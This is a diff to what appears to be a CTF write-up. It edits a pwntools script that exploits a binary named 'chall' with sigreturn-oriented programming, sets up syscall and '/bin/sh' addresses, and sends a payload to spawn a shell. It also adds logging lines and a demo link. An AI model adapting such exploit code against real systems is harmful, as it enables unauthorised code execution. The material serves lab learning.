@@ -236,7 +236,7 @@ from warnings import filterwarnings
 exe = context.binary = ELF(args.EXE or 'chall')
 elf = exe
 filterwarnings("ignore")
-context.log_level = 'debug'
+context.log_level = 'info'
 
 def start(argv=[], *a, **kw):
     if args.GDB:
@@ -266,7 +266,7 @@ def srop():
     offset = 32
     syscall = 0x0000000000401047 # syscall; ret;
     nbytes = b'A'*15
-    sh = 0x402000+0xf # "/bin/sh"
+    sh = 0x402000+0xf
 
 
     payload = flat({
@@ -286,7 +286,15 @@ def srop():
 
     payload += bytes(frame)
 
+    info("[*] Syscall Address: %#x", syscall)
+    sleep(2)
+    info("[*] Shell Address: %#x", sh)
+    sleep(2)
+    info("[*] Sending Payload ")
+    sleep(3)
     io.sendline(payload)
+    info("[*] Spawning Shell :)")
+    sleep(3)
     io.sendafter(b'world!!', nbytes)
 
 
@@ -299,10 +307,12 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+    
 ```
 
-
-
+Running it spawns a shell 🐚
+[![asciicast](https://asciinema.org/a/632786.svg)](https://asciinema.org/a/632786)
 
 
 
